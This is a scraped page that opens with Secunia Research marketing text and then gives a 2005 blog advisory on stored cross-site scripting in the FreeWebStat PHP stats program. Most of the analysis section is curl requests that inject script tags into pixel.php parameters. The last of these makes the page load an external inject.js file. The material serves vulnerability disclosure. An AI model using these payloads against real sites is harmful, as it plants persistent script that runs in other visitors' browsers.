How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

### [Free Web Stat Multiple XSS Vulnerabilities](/2005/11/25/free-web-stat/)

November 25, 2005 at 2:15 am - Filed under [Hacks](/category/hacks/), [Language EN](/category/language-en/) - 1095 words, reading time ~3 minutes - [Permalink](/2005/11/25/free-web-stat/) - [Comments](http://news.ycombinator.com/submitlink?u=http://www.ush.it/2005/11/25/free-web-stat/&t=Free%20Web%20Stat%20Multiple%20XSS%20Vulnerabilities)

FreeWebStat 1.0 rev37 (the last version at the write time) is vulnerable to multiple XSS. The impact is a little bigger since datas will be stored in a flat file and the result of a single query will persist for some time on the backend. A well-timed loop of requests will assure the XSS to be permanent.

This can be used to inject arbitrary JS code into the page and make the JS pseudo-permanent, so other users will execute the JS without the need of any special url.

```

FreeWebStat Multiple XSS Vulnerabilities

 Name              Multiple XSS Vulnerabilities in FreeWebStat
 Systems Affected  FreeWebStat (verified on 1.0 rev37)
 Severity          Medium Risk
 Vendor            www.freewebstat.com
 Advisory          http://www_ush_it/2005/11/25/free-web-stat/
 Author            Francesco "aScii" Ongaro (ascii at katamail . com)
 Date              20051125

I. BACKGROUND

FreeWebStat is a PHP stats program, more information is
available at the vendor site.

II. DESCRIPTION

FreeWebStat 1.0 rev37 (the last version at the write time)
is vulnerable to multiple XSS. The impact is a little bugger
since datas will be stored to file and the result of a single
query will persist for some time on the backend. A well-timed
loop of requests will assure the XSS to be permanent.

We issued an advisory for an other application of the same
author called "Php Web Statistik Multiple Vulnerabilities"
who said "new version with all fixed bugs can be found
under www.freewebstat.com". Well, we downloaded this version
and seen the same type of vulnerabilities..

The old advisory:
http://www_ush_it/2005/11/19/php-web-statistik/

III. ANALYSIS

This vulnerability can be exploited by a GET query.

1) logdb.html XSS

logdb.html is vulnerable to JS injection using
anti-escape methods (eg: single quotes will be stripped
but there are a lot of working workrounds for this)

1.1) Curl the pixel.php

curl "http://local.asciistation.zapto.org/fws/pixel.php
?domain=<script>alert(1)</script>
&site=<script>alert(2)</script>
&jsref=<script>alert(3)</script>
&jsres=<script>alert(4)</script>
&jscolor=<script>alert(5)</script>"
-A "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; (R1 1.3))"
-e "http://www_ush_it"

$site, $jsref, &jsres and $jscolor are vulnerable.

Loading an url in $jsref will give you a full link (if the logdb.html
page have any pr you can drain some of it.

1.2) Call stats.php

This will generate the new logdb.html file.

1.3) Visit logdb.html

You will see some alerts. : )

The order with the example query is 2 3 2 3 4 5.

1.4) Some test curls

ascii> curl "http://local.asciistation.zapto.org/fws/pixel.php?
domain=ush.it&site=<script>alert(123)&jsref=1024x768
&jsres=1337&jscolor=red" -e "http://www.google.it/search?q=
lello+splendor++&hl=it&lr=&start=10&sa=N" -A "Mozilla/4.0
(compatible; MSIE 6.0; Windows NT 5.1; SV1; (R1 1.3))"

ascii> curl "http://local.asciistation.zapto.org/fws/pixel.php?
domain=ush.it&site=aa&jsref=http://ww.tin.it&jsres=1337&jscolor=red"
-e "http://www.google.it/search?q=lello+splendor++&hl=it&lr=&start=
10&sa=N" -A "Mozilla/4.0 (compatible; MSIE 6.0;
Windows NT 5.1; SV1; (R1 1.3))"

ascii> curl "http://local.asciistation.zapto.org/fws/pixel.php?
domain=ush.it&site=aa&jsref=http://ww.tin.it&jsres=13
37&jscolor=red" -e "http://www.suma.it/" -A "Mozilla/4.0
(compatible; MSIE 6.0; Windows NT 5.1; SV1; (R1 1.3))"

ascii> curl "http://local.asciistation.zapto.org/fws/pixel.php?
domain=<script>alert(1)</script>&site=
<script>alert(2)&jsref=</script><script>alert(3)</script>
&jsres=<script>alert(4)</script>&jscolor=
<script>alert(5)</script>"
-A "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; (R1 1.3))"
-e "http://www_ush_it"

2) stat.php search key XSS

2) Detecting the search key XSS

- if ( !in_array ( $logfile_entries [ 2 ] , $ip_archive ) )
+ if (TRUE)

# save the referer except the own domain name.
if the browser value is empty, do not save
+ echo "DEBUG<h1>".$logfile_entries [ 7 ]."</h1>";
if ( ( strpos ( $logfile_entries [ 7 ] , $exception_domain )
=== FALSE ) && ( trim ( $logfile_entries [ 7 ] ) != "" ) )

ascii> curl "http://local.asciistation.zapto.org/fws/pixel.php?domain=ush.it&
site=aa&jsref=sukasuka&jsres=1337&jscolor=red"

Will display as many "DEBUG sukasuka" under the header and over the
"summary" as the number of new queries.

# save the referer except the own domain name.
if the browser value is empty, do not save
if ( ( strpos ( $logfile_entries [ 7 ] , $exception_domain )
=== FALSE ) && ( trim ( $logfile_entries [ 7 ] ) != "" ) )

$logfile_entries[7] is the $jsref variable.

ascii> curl "http://local.asciistation.zapto.org/fws/pixel.php?
site=&jsres=&jscolor=&jsref=ssss&domain="

search words ( 1 ) lello splendor 100 % 1
search engines ( 1 ) Google 100 % 1

ascii> curl "http://local.asciistation.zapto.org/fws/pixel.php?
site=&jsres=&jscolor=&jsref=http://www.google.it/search?
q=lello+splendor++&hl=it"

ascii> curl "http://local.asciistation.zapto.org/fws/pixel.php?
site=&jsres=&jscolor=&jsref=http://www.google.it/search?
q=<script>alert(123456789)</script>++&hl=it"

Now the injection is executed in 2 points, the referer table and the keyword
table.

2.2) Exploiting the search key XSS

stat.php give us some tricks, and we are evil. The string will be
lowered and any + or - char will became a (real, not a %20) space.

$terms = str_replace( '\"', "", $terms );   # delete \"
$terms = strtolower( $terms );              # string to lower

$terms = str_replace( "+" , " ", $terms );  # replace + with space
$terms = str_replace( "-" , " ", $terms );  # replace - with space

ascii> curl "http://local.asciistation.zapto.org/fws/pixel.php?site=
&jsres=&jscolor=&jsref=http://www.google.it/search?
q=ppoopp<script language="javascript"-src=
"http://local.asciistation.zapto.org/fws/inject.js"></script>&hl=it"
